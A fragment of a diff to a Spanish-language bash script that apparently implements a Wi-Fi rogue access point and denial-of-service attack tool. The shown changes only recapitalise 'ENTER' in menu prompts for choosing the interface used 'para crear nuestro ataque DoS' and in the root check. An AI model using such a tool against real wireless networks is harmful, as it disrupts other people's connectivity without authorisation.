 fi
@@ -1225,20 +1255,21 @@ if [ $opcion -le $cuenta ]; then
     cuenta=$((cuenta+1))
     cat ${pwd}lista_interfaces | grep -v $iface_ap| sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
     iface_dos=`cat ${pwd}iface_dos`
-    echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para crear nuestro ataque DoS. Pulsa enter para continuar"
+    echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para crear nuestro ataque DoS. Pulsa ENTER para continuar"
     read
     scan
 else
-    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa enter para probar otra vez${NORMAL}"
+    echo -ne "${BLANCO}[!!]${CYAN} `shuf -n 1 ${pwd}torpe`${AZUL} $opcion${NORMAL} no es una respuesta valida. Pulsa ENTER para probar otra vez${NORMAL}"
     read
     elegir_monitor
 fi
 }
+
 bandera=fax
 systemctl stop lighttpd &>/dev/null
 systemctl disable lighttpd &>/dev/null
 if ! [ $(id -u) = 0 ]; then
-    echo;echo -ne "${ROJO}[::]${BLANCO} El script se debe ejecutar con privilegios. Prueba con sudo. Pulsa enter para salir"
+    echo;echo -ne "${ROJO}[::]${BLANCO} El script se debe ejecutar con privilegios. Prueba con sudo. Pulsa ENTER para salir"
     salir=1
     read
     exit 1
